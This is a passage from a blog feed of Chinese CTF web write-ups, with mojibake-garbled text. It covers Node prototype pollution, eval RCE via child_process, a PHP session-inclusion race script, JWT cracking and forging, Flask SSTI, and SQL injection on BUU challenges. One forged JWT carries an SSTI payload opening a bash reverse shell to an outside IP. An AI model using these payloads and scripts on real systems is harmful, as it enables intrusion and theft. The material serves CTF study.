class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> r = <span class="string">&#x27;go away you are not ture admin&#x27;</span></span><br><span class="line">    res.<span class="title function_">send</span>(r);</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>,checkLogin,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> r = <span class="string">&#x27;Hello admin ! here is you flag&#123;xxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(r);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;80&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:80`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>æœ‰<code>merge()</code>å’Œ<code>clone()</code>å‡½æ•°ï¼Œåº”è¯¥æ˜¯åŸå‹é“¾æ±¡æŸ“</p>
<p>æœ‰å››ä¸ªè·¯ç”±ï¼Œ&#x2F;ï¼Œ&#x2F;loginï¼Œ&#x2F;userï¼Œ&#x2F;adminï¼Œè·å–flagéœ€è¦è®¿é—®&#x2F;adminï¼Œä½†æ˜¯éœ€è¦ç™»å½•ï¼Œåœ¨&#x2F;loginä¸­</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503154837759.png" alt="image-20230503154837759"></p>
<p>è®©usernameç­‰äºadminåï¼ŒAdminä¼šèµ‹å€¼0ï¼Œè¿›è€Œä¼šè‡ªåŠ¨è·³è½¬åˆ°&#x2F;userï¼Œéœ€è¦è€ƒè™‘æ€æ ·è®©Adminç­‰äº1ï¼Œè¿™æ ·å°±èƒ½è·³è½¬åˆ°&#x2F;admin</p>
<p>ä½¿ç”¨åŸå‹é“¾æ±¡æŸ“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;username&quot;:&quot;admin&quot;,&quot;Admin&quot;:&quot;1&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="äº”"><a href="#äº”" class="headerlink" title="äº”"></a>äº”</h2><p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503160943980.png" alt="image-20230503160943980"></p>
<p>æºç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">IfLogin</span>(<span class="params">req, res, next</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">admin=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;ğŸ˜adminğŸ˜&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">app=<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParse.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="string">&#x27;********&#x27;</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="title class_">IfLogin</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;if you want flag .then go to /admin ,and find a way to get it . no pain, no gain !&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">user</span>)</span><br><span class="line"> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> username=req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">var</span> password=req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(username||password)&#123;</span><br><span class="line">        <span class="keyword">if</span>(username.<span class="title function_">includes</span>(<span class="string">&#x27;ad&#x27;</span>))&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;you not the true admin&#x27;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(username==admin.<span class="property">username</span>&amp;&amp;password===admin.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">6</span>))&#123;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">                  req.<span class="property">session</span>.<span class="property">user</span>=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;isadmin&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                  req.<span class="property">session</span>.<span class="property">user</span>=&#123;<span class="string">&#x27;username&#x27;</span>:username&#125;</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line">                  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">12354325</span>)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;please enter usrname or password&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>,<span class="title class_">IfLogin</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isadmin</span>===<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> cmd=req.<span class="property">query</span>.<span class="property">cmd</span>;</span><br><span class="line">        <span class="keyword">if</span>(cmd)&#123;</span><br><span class="line">           res.<span class="title function_">send</span>( <span class="built_in">eval</span>(cmd))</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;give me you cmd&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;81&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:81`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸‰ä¸ªè·¯ç”±ï¼Œ&#x2F;ï¼Œ&#x2F;loginï¼Œ&#x2F;admin</p>
<p>å…ˆæ‰¾èƒ½åˆ©ç”¨çš„ç‚¹ï¼Œåœ¨&#x2F;adminè·¯ç”±é‡Œï¼Œæœ‰evalå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæƒ³è¦ä½¿ç”¨éœ€è¦è®©<code>req.session.user.isadmin===&#39;1&#39;</code></p>
<p>çœ‹&#x2F;loginè·¯ç”±</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503162256561.png" alt="image-20230503162256561"></p>
<p>æ»¡è¶³<code>username==admin.username&amp;&amp;password===admin.password.substring(1,6)</code>å³å¯è®©<code>req.session.user.isadmin===&#39;1&#39;</code>ä½†æ˜¯éœ€è¦ç»•è¿‡</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503162405157.png" alt="image-20230503162405157"></p>
<p>è€Œè®¾ç½®çš„adminçš„usernameå’Œpasswordæ˜¯</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503162626184.png" alt="image-20230503162626184"></p>
<p>å› ä¸ºincludeså‡½æ•°ï¼Œä¸èƒ½ç›´æ¥ä¼ usernameä¸ºadmin</p>
<p>æŸ¥è¯¢èµ„æ–™æŸ¥åˆ°jsçš„includeså‡½æ•°å¤„ç†å­—ç¬¦ä¸²å’Œæ•°å­—æ˜¯ä¸ä¸€æ ·çš„</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503163943355.png" alt="image-20230503163943355"></p>
<p>ä½¿ç”¨æ•°ç»„å°±å¯ä»¥ç»•è¿‡ï¼Œå†çœ‹passwordï¼Œ<code>substring(1,6)</code>å‡½æ•°æ˜¯æˆªå–ç¬¬äºŒä¸ªå¯¼åˆ°ç¬¬å…­ä¸ªå­—ç¬¦</p>
<p>è€Œè¿™ä¸ªæœ‰ä¸ªè¡¨æƒ…ç¬¦å·ï¼Œè¿™ä¸ªç®—ä¸¤ä¸ªå­—èŠ‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ˆå°†ğŸ˜adminğŸ˜è¿›è¡Œunicodeç¼–ç </span><br><span class="line">ä¸º\ud83d\ude0d\u0061\u0064\u006d\u0069\u006e\ud83d\ude0d</span><br><span class="line">é€‰å–ç¬¬äºŒä¸ªåˆ°ç¬¬å…­ä¸ªå­—èŠ‚å°±æ˜¯</span><br><span class="line">\ude0d\u0061\u0064\u006d\u0069</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›è¡Œjsonä¼ å‚</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503164342117.png" alt="image-20230503164342117"></p>
<p>è®¿é—®&#x2F;adminï¼ŒæˆåŠŸè®¿é—®</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503164407098.png" alt="image-20230503164407098"></p>
<p>æœ€ågetä¼ å‚cmdä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸå°†flagä¸‹è½½ä¸‹æ¥</p>
<h2 id="å…­"><a href="#å…­" class="headerlink" title="å…­"></a>å…­</h2><p>includeæ¡ä»¶ç«äº‰ï¼Œè¿‡æ»¤äº†å¾ˆå¤šï¼ŒåŸºæœ¬é”æ­»äº†</p>
<p>æœ€åæ˜¯ä¸€ä¸ªsessionæ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨æ¡ä»¶ç«äº‰</p>
<p>pyè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-08-23 18:08:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-08-23 20:19:18</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;e063jurhs0etba9hlo4207r124&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://81.70.221.206:9289/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment">#åˆ›å»ºæ–‡ä»¶</span></span><br><span class="line">        response = session.post(                            <span class="comment">#postæ–‡ä»¶ä¸Šä¼ </span></span><br><span class="line">            url,                                            <span class="comment">#url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment">#è®¾ç½®cookieä¸ºæˆ‘ä»¬çš„sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>&#125;,<span class="comment">#å†™é©¬æˆ–æ‰§è¡Œå†…å®¹</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment">#ä¸Šä¼ æ–‡çš„å…·ä½“å†…å®¹ï¼Œæ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        payload = <span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid                 <span class="comment">#åŒ…å«æˆ‘ä»¬çš„sessionè·¯å¾„</span></span><br><span class="line"></span><br><span class="line">        response = session.get(url = url+payload)           <span class="comment">#è¯»å–é¡µé¢</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> <span class="keyword">in</span> response.text:                     <span class="comment">#è¿”å›é¡µé¢</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  <span class="comment">#åŒçº¿ç¨‹è¿è¡Œ</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br></pre></td></tr></table></figure>







]]></content>
  </entry>
  <entry>
    <title>Drink from my Flask#1(HeroCTF 2023)</title>
    <url>/2023/05/15/Drink%20from%20my%20Flask#1(HeroCTF%202023)/</url>
    <content><![CDATA[<p>Drink from my Flask#1(HeroCTF 2023)</p>
<span id="more"></span>

<p>![image-20230515193407724](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193407724.png)</p>
<p>è¾“å…¥è¯•è¯•</p>
<p>![image-20230515193427263](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193427263.png)</p>
<p>è®¿é—®&#x2F;adminï¼Œæ˜¾ç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin was not found</span><br><span class="line"></span><br><span class="line">Only routes / and /adminPage are available</span><br></pre></td></tr></table></figure>

<p>è®¿é—®&#x2F;adminPage</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry but you can&#x27;t access this page, you&#x27;re a &#x27;guest&#x27;</span><br></pre></td></tr></table></figure>

<p>çœ‹cookie</p>
<p>![image-20230515194034852](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194034852.png)</p>
<p>æ˜¯jwt</p>
<p>![image-20230515194050770](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194050770.png)</p>
<p>ä½†æ˜¯æ²¡æœ‰å¯†é’¥ï¼Œä½¿ç”¨jwt_toolæš´åŠ›ç ´è§£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -C -d /jwt-common.txt</span><br></pre></td></tr></table></figure>

<p>![image-20230515195020292](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195020292.png)</p>
<p>å¾—åˆ°å¯†é’¥æ˜¯keyï¼Œè¿›è¡Œä¼ªé€ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -T -S hs256 -p &quot;key&quot;</span><br></pre></td></tr></table></figure>

<p>![image-20230515195255107](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195255107.png)</p>
<p>å°†cookieæ¢æˆ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.AVjKNp3JWkmYQdHzpEVpAU9pfGSiwJykT3lbWpQYhMY</span><br></pre></td></tr></table></figure>

<p>åˆ·æ–°ç½‘é¡µ</p>
<p>![image-20230515195334276](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195334276.png)</p>
<p>å†ä¼ªé€ ä¸€ä¸ª</p>
<p>![image-20230515195508165](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195508165.png)</p>
<p>cookieæ¢æˆ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3s3Kjd9fSJ9.z__5DxmRbygPH1em02OyYj1Zt0GUbIk_zRoQ2twuzU8</span><br></pre></td></tr></table></figure>

<p>![image-20230515195534813](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195534813.png)</p>
<p>æœ‰ssti</p>
<p>å†ä¼ªé€ å‘½ä»¤æ‰§è¡Œ</p>
<p>![image-20230515195835660](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195835660.png)</p>
<p>ä½¿ç”¨cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2Jhc2ggLWMgXFxcImJhc2ggLWkgPiYgL2Rldi90Y3AvNDMuMTQzLjE1NS45MC8xMjM0IDA-JjFcXFwiJykucmVhZCgpfX0ifQ.ZqhpjUrt2W8_A7VKiG42i7un4gB7oyB5fL6hUaN1-QI</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨äº‘æœåŠ¡å™¨ç›‘å¬1234ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>

<p>![image-20230515200013911](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515200013911.png)</p>
]]></content>
  </entry>
  <entry>
    <title>buuçš„SQL</title>
    <url>/2022/12/03/SQL%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL	[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL	[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL	[GXYCTF2019]BabySQli	[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</p>
<span id="more"></span>

<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h3><p>1.å…ˆä½¿ç”¨ä¸‡èƒ½å¯†ç 1â€™ or 1&#x3D;1#è¿›è¡Œå°è¯•æŸ¥çœ‹æ˜¯å¦æœ‰å›æ˜¾ï¼ŒæŸ¥çœ‹å­˜åœ¨å›æ˜¾</p>
<p>2.æŸ¥çœ‹å­—æ®µæ•°ï¼Œä½¿ç”¨order byæˆ–è€…union selectï¼Œå› ä¸ºæ˜¯åœ¨httpè¡Œè¿›è¡Œçš„è¾“å…¥#æ³¨é‡Šæ— æ³•ä½¿ç”¨ï¼Œæ‰€ä»¥ä½¿ç”¨%23æ¥è¿›è¡Œæ³¨é‡Š</p>
<p>3.ç»è¿‡è¯•éªŒæœ‰3ä¸ªå­—æ®µï¼Œç„¶åè¿›è¡Œè”åˆæ³¨å…¥å³å¯</p>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h3><p>1.ç»è¿‡è¯•éªŒå­˜åœ¨unionï¼Œselectï¼Œorï¼Œæ³¨é‡Šç¬¦ï¼Œandï¼Œfromï¼ŒwhereåŠå…¶ä»–è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨%23è¿›è¡Œæ³¨é‡Šï¼Œè¿™é‡Œå¯ä»¥éƒ½æ˜¯ç”¨åŒå†™ç»•è¿‡</p>
<p>2.ä½¿ç”¨ä¸‡èƒ½å¯†ç ï¼Œå­˜åœ¨å›æ˜¾</p>
<p>3.ä½¿ç”¨è”åˆæ³¨å…¥check.php?username&#x3D;1â€™ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23&amp;password&#x3D;123æ¥çˆ†å‡ºæ‰€æœ‰çš„åº“</p>
<p>4.é€‰ç”¨ctfåº“ï¼Œè¿›è¡Œçˆ†è¡¨åä¸ºflagï¼Œå†çˆ†å­—æ®µä¹Ÿä¸ºflag</p>
<p>5.æœ€åçˆ†æ•°æ®</p>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h3><p>1.å­˜åœ¨ç©ºæ ¼ï¼Œunionï¼Œandï¼Œ&#x3D;ï¼Œè¿‡æ»¤</p>
<p>2.ä½¿ç”¨æŠ¥é”™å‹æ³¨å…¥ï¼Œæ³¨å…¥æ—¶çš„è¯­å¥ä¸å¯ä»¥å¸¦æœ‰ç©ºæ ¼ï¼Œä½¿ç”¨check.php?username&#x3D;1&amp;password&#x3D;1â€™or(extractvalue(1,concat(0x7e,(select(database())))))%23æ¥çˆ†å‡ºæ•°æ®åº“</p>
<p>3.ç„¶åç»§ç»­ä½¿ç”¨æŠ¥é”™å‹æ³¨å…¥æ¥çˆ†è¡¨ï¼Œå­—æ®µï¼Œ</p>
<p>4.è·å¾—æ•°æ®æ—¶flagæ— æ³•æ˜¾ç¤ºå®Œå…¨ï¼Œä½¿ç”¨left()å’Œright()å‡½æ•°æ¥è·å¾—å…¨éƒ¨æ•°æ®ï¼Œä¾‹å¦‚group_concat(right(password,32))</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left()å’Œright()å‡½æ•°ç”¨æ³•</span><br><span class="line">LEFT (input_string , number_of_characters)</span><br><span class="line">input_stringå¯ä»¥æ˜¯æ–‡å­—å­—ç¬¦ä¸²ï¼Œå˜é‡æˆ–åˆ—ã€‚</span><br><span class="line">number_of_charactersæ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼ŒæŒ‡å®šå°†è¿”å›input_stringçš„å­—ç¬¦æ•°ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>1.å­˜åœ¨()è¿‡æ»¤ï¼Œä½¿ç”¨unionç›²æ³¨</p>
<h3 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h3><p>1.è¯¥å…³æ˜¯ç›²æ³¨ï¼Œå¹¶ä¸”å­˜åœ¨è¿‡æ»¤ï¼Œæ‰“å¼€ç½‘é¡µä¸Šå·²ç»æç¤ºflagåœ¨flagè¡¨çš„flagåˆ—</p>
<p>2.è¾“å…¥1å‘ç°è¿”å›Hello, glzjin wants a girlfriend.è¾“å…¥2è¿”å›Do you want to be my girlfriend?</p>
<p>3.åˆ©ç”¨1å’Œ2è¿”å›çš„å€¼è¿›è¡Œæ„é€ if(substr((select(flag)from(flag)),1,1)&#x3D;â€™â€™,1,2)å¦‚æœæ­£ç¡®å°±ä¼šè¿”å›è¾“å…¥1æ—¶çš„å†…å®¹ï¼Œä¸æ­£ç¡®å°±ä¼šè¿”å›è¾“å…¥2æ—¶çš„å†…å®¹</p>
<p>4.ç„¶åå†™ç›²æ³¨è„šæœ¬(æœ‰ç‚¹å°é—®é¢˜)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;:</span><br><span class="line">        url=&quot;http://473b566b-93a5-4ae6-b850-b77390a9dc6a.node4.buuoj.cn:81&quot;</span><br><span class="line">        sqls=&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;.format(i,j)</span><br><span class="line">        data=&#123;&quot;id&quot;:sqls&#125;</span><br><span class="line">        c = s.post(url,data=data)</span><br><span class="line">        if &#x27;Hello&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>DASCTF X GFCTF 2022çš„webéƒ¨åˆ†è§£é¢˜</title>
    <url>/2023/04/16/DASCTF%20X%20GFCTF%202022/</url>
    <content><![CDATA[<p>EasyPOP	EasyLove</p>
<span id="more"></span>

<h2 id="EasyPOP"><a href="#EasyPOP" class="headerlink" title="EasyPOP"></a>EasyPOP</h2><p>1.æºç </p>
